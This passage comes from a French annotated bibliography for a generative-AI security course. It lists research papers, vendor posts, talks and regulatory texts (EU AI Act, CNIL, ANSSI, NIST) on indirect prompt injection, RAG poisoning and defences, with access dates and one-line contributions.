    arXiv:2302.12173 (publié à AISec '23, ACM).
    https://arxiv.org/abs/2302.12173
    Type : article de recherche. v2 du 5 mai 2023. Consulté le 24/11/2026.
    [S4.2] Clé : [Greshake23]
    Apport : article fondateur de l'injection indirecte (déjà en
    bibliographie, revérifié).

15. Hines K., Lopez G., Hall M., Zarfati F., Zunger Y. et Kiciman E. (2024),
    *Defending Against Indirect Prompt Injection Attacks With Spotlighting*,
    Microsoft Research / arXiv.
    https://www.microsoft.com/en-us/research/publication/defending-against-indirect-prompt-injection-attacks-with-spotlighting/
    Type : article de recherche. Mars 2024. Consulté le 24/11/2026. [S4.2]
    Clé : [Hines24]
    Apport : technique de séparation du contenu non fiable et chiffres
    (plus de 50 % à moins de 2 %, non adaptatif).

16. Paverd A. (2025), *How Microsoft defends against indirect prompt injection
    attacks*, MSRC Blog, Microsoft.
    https://www.microsoft.com/en-us/msrc/blog/2025/07/how-microsoft-defends-against-indirect-prompt-injection-attacks
    Type : billet d'ingénierie éditeur. 29 juillet 2025. Consulté le
    24/11/2026. [S4.2] Clé : [MSRC25]
    Apport : défense en profondeur en production (prévention, détection,
    limitation d'impact), lien avec les design patterns.

17. OpenAI (2025), *Understanding prompt injections: a frontier security
    challenge*, openai.com.
    https://openai.com/index/prompt-injections
    Type : billet éditeur. 7 novembre 2025. Consulté le 24/11/2026. [S4.2]
    Clé : [OpenAI-PI]
    Apport : approche multicouche (instruction hierarchy, moniteurs, sandbox,
    confirmations), conseil « instructions explicites et étroites ».

18. Anthropic (2025), *Mitigating the risk of prompt injections in browser
    use*, anthropic.com/research.
    https://www.anthropic.com/research/prompt-injection-defenses
    Type : billet de recherche éditeur. 24 novembre 2025. Consulté le
    24/11/2026. [S4.2] Clé : [Anthropic-PI]
    Apport : RL, classifieurs, red teaming ; « 1 % de succès reste un risque
    significatif ».

19. Willison S. (2023), *New prompt injection attack on ChatGPT web version.
    Markdown images can steal your chat data*, simonwillison.net.
    https://simonwillison.net/2023/Apr/14/new-prompt-injection-attack-on-chatgpt-web-version-markdown-imag/
    Type : billet. 14 avril 2023 (mise à jour : mitigé en décembre 2023).
    Consulté le 24/11/2026. [S4.2, S4.4] Clé : [Willison-MdImg]
    Apport : mécanisme d'exfiltration par image Markdown.

20. Zou W., Geng R., Wang B. et Jia J. (2025), *PoisonedRAG: Knowledge
    Corruption Attacks to Retrieval-Augmented Generation of Large Language
    Models*, USENIX Security '25.
    https://www.usenix.org/conference/usenixsecurity25/presentation/zou-poisonedrag
    Type : article de recherche (conférence). 2025. Consulté le 24/11/2026.
    [S2.3, S4.2] Clé : [Zou25]
    Apport : 90 % de succès avec 5 textes injectés par question cible.

21. Model Context Protocol (2026), *Security Best Practices*, spécification
    MCP, version 2026-07-28 (versions 2025-06-18 et 2025-11-25 également en
    ligne).
    https://modelcontextprotocol.io/docs/2026-07-28/tutorials/security/security_best_practices
    Type : documentation officielle. Version 2026-07-28. Consulté le
    24/11/2026. [S4.2, S5] Clé : [MCP-SBP]
    Apport : confused deputy, token passthrough, SSRF, scopes, isolation stdio.

22. Rehberger J. (2025), *Agentic ProbLLMs: Exploiting AI Computer-Use and
    Coding Agents*, 39th Chaos Communication Congress (39C3), Hambourg.
    https://events.ccc.de/congress/2025/hub/en/event/detail/agentic-probllms-exploiting-ai-computer-use-and-coding-agents
    (vidéo : https://www.youtube.com/watch?v=8pbz5y7_WkM, non visionnée ;
    diapositives : embracethered.com, non lues)
    Type : conférence filmée (lecture de la description détaillée). 28 décembre
    2025. Consulté le 24/11/2026. [S4.2, S5.3] Clé : [Rehberger-39C3]
    Apport : plus de 20 vulnérabilités d'agents de code (août 2025), chaîne
    « injection, confused deputy, invocation automatique d'outil ».

23. Union européenne (2024, consolidé 2026), *Règlement (UE) 2024/1689
    (AI Act)*, EUR-Lex, texte consolidé 02024R1689-20260727 ; et
    Commission européenne, *Timeline for the Implementation of the EU AI Act*,
    AI Act Service Desk.
    https://eur-lex.europa.eu/eli/reg/2024/1689/eng et
    https://ai-act-service-desk.ec.europa.eu/en/ai-act/eu-ai-act-implementation-timeline
    Type : texte officiel + page officielle. Consolidé au 27 juillet 2026.
    Consulté le 24/11/2026. [S5] Clé : [AIAct-Timeline]
    Apport : calendrier tenant compte de l'Omnibus (2025 à 2028).

24. Parlement européen, Niestadt M. (2026), *Digital Omnibus on AI*,
    Legislative Train Schedule.
    https://www.europarl.europa.eu/legislative-train/spotlight-Simplification%202024-2029/file-digital-omnibus-on-ai
    Type : fiche institutionnelle. Mise à jour du 25 octobre 2026. Consulté le
    24/11/2026. [S5] Clé : [EP-Omnibus]
    Apport : procédure complète, règlement (UE) 2026/1744 publié au JO le
    24 juillet 2026, nouvelles dates. Complément : Cuatrecasas (2026), *Digital
    Omnibus on AI: Key Changes*, Legal Flash, juillet 2026 (cabinet d'avocats,
    secondaire) [Cuatrecasas26],
    https://www.cuatrecasas.com/resources/ai-omnibus-regulation-eng-txt-6a6c91679b13e331880996.pdf

25. Commission européenne (2026), *Transparency obligations under Article 50
    of the AI Act* (FAQ), digital-strategy.ec.europa.eu.
    https://digital-strategy.ec.europa.eu/en/faqs/transparency-obligations-under-article-50-ai-act
    Type : FAQ officielle. Dernière mise à jour 24 juillet 2026. Consulté le
    24/11/2026. [S4.2, S5.3] Clé : [EC-Art50]
    Apport : critères d'application de l'art. 50(1), marquage 50(2), sanctions,
    transition au 2 décembre 2026.

26. CNIL (2024), *Comment déployer une IA générative ? La CNIL apporte de
    premières précisions* (et FAQ associée), cnil.fr.
    https://www.cnil.fr/fr/comment-deployer-une-ia-generative-la-cnil-apporte-de-premieres-precisions
    Type : recommandation d'autorité. 18 juillet 2024. Consulté le 24/11/2026.
    [S5] Clé : [CNIL-Deploy]
    Apport : règles pratiques de déploiement (besoin, usages interdits,
    systèmes locaux).

27. CNIL (2025), *Les fiches pratiques IA* et *IA : la CNIL finalise ses
    recommandations sur le développement des systèmes d'IA*, cnil.fr.
    https://www.cnil.fr/fr/les-fiches-pratiques-ia et
    https://cnil.fr/fr/ia-finalisation-recommandations-developpement-des-systemes-ia
    Type : recommandations d'autorité. Finalisées le 22 juillet 2025. Consulté
    le 24/11/2026. [S5] Clé : [CNIL-Fiches]
    Apport : 13 fiches RGPD (dont sécurité, statut des modèles) et liste de
    vérification.

28. ANSSI (2024), *Recommandations de sécurité pour un système d'IA
    générative*, guide ANSSI (MesServicesCyber).
    https://messervices.cyber.gouv.fr/guides/en-security-recommendations-generative-ai-system
    (PDF FR : https://messervices.cyber.gouv.fr/documents-guides/Recommandations_de_s%C3%A9curit%C3%A9_pour_un_syst%C3%A8me_d_IA_g%C3%A9n%C3%A9rative.pdf)
    Type : guide institutionnel. 29 avril 2024. Consulté le 24/11/2026 (PDF lu
    en extrait). [S4.2, S5] Clé : [ANSSI24]
    Apport : architecture sécurisée, filtrage entrées/sorties, injection
    indirecte, défense en profondeur.

29. Autio C., Schwartz R., Dunietz J. et al. (2024), *Artificial Intelligence
    Risk Management Framework: Generative Artificial Intelligence Profile*
    (NIST AI 600-1), NIST.
    https://www.nist.gov/publications/artificial-intelligence-risk-management-framework-generative-artificial-intelligence
    Type : référentiel. 26 juillet 2024. Consulté le 24/11/2026. [S5]
    Clé : [NIST600-1]
    Apport : profil de risques IA générative, cadre volontaire américain.

30. Lyn Fatt Y. (2026), *Laravel AI SDK Adds Human-in-the-Loop Tool
    Approval*, Laravel News ; et Laravel (2026), *Introducing Laravel AI SDK
    v1.0*, laravel.com/blog.
    https://laravel-news.com/laravel-ai-sdk-adds-human-in-the-loop-tool-approval et
    https://laravel.com/blog/introducing-laravel-ai-sdk-v1
    Type : article de presse spécialisée + billet éditeur. 30 juillet 2026
    (v0.10.0 du 21 juillet 2026) ; v1.0 le 23 septembre 2026. Consulté le
    24/11/2026. [S4.2, S4.3] Clés : [LaravelNews-HITL] [Laravel-v1]
    Apport : HITL natif dans le SDK, à comparer à l'implémentation manuelle du
    TP ; la bibliographie « version 0.x » est obsolète.

31. Microsoft (2023-2026), *Generative AI for Beginners* (21 leçons), GitHub.
    https://github.com/microsoft/generative-ai-for-beginners
    Type : cours en ligne de référence. Consulté le 24/11/2026. [ordre]
    Clé : [MS-GenAI4B]
    Apport : point de comparaison de l'ordre (sécurité en leçon 13, entre
    function calling et RAG).

32. DeepLearning.AI et Giskard (2024), *Red Teaming LLM Applications*,
    deeplearning.ai.
    https://www.deeplearning.ai/courses/red-teaming-llm-applications
    Type : cours court vidéo. Consulté le 24/11/2026 (page de présentation
    seulement). [S4.2, S4.4] Clé : [DLAI-RedTeam]
    Apport : pédagogie « attaquer pour comprendre ».

33. The Cyber Threat Perspective (2026), *Episode 185: A Toddler with a
    Bazooka: The Real Risk of AI Agents*, podcast (Apple Podcasts).
    https://podcasts.apple.com/us/podcast/episode-185-a-toddler-with-a-bazooka-the/id1623448219?i=1000773251826
    Type : podcast (46 min, description détaillée lue, épisode non écouté).
    Consulté le 24/11/2026. [S4.2] Clé : [CTP-185]
    Apport : vulgarisation de la trifecta + deux catégories (privilèges,
    actions autonomes : approbations, limites de débit, coupe-circuit).
    Date de l'épisode non vérifiée.

### Non vérifié / à faire

- Le texte intégral des 10 fiches OWASP 2026 autres que LLM01 n'a pas été lu
  directement (rangs recoupés via hub officiel + CSA).
- Le PDF ANSSI n'a été lu qu'en extraits (nombre exact de recommandations non
  vérifié). Une publication ANSSI 2025 sur l'IA n'a pas été recherchée.
- NIST AI 100-2 E2025 cité via OWASP, non ouvert.
- Vidéo 39C3 et diapositives Rehberger non visionnées.
